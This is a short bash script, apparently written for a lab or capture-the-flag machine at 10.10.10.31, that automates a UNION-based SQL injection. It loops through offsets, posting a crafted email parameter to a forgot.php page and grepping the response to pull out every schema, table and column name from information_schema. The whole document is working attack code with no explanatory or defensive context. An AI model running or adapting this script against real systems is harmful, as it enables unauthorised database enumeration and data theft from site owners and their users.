i=0
#for k in $(seq 0 100);do
while [ $i -le 100 ] 
do
	payload="email=gg@gmail.com' UniOn select 1,2,3,CONCAT(table_schema,':',table_name,':',column_name,':','gg@g.com') from information_schema.columns where table_schema != 'information_schema' limit 1 offset $i-- -"
	curl -s -d "$payload" http://10.10.10.31/cmsdata/forgot.php | grep -o '[^ ]*@g.com'
	((i++));
	done
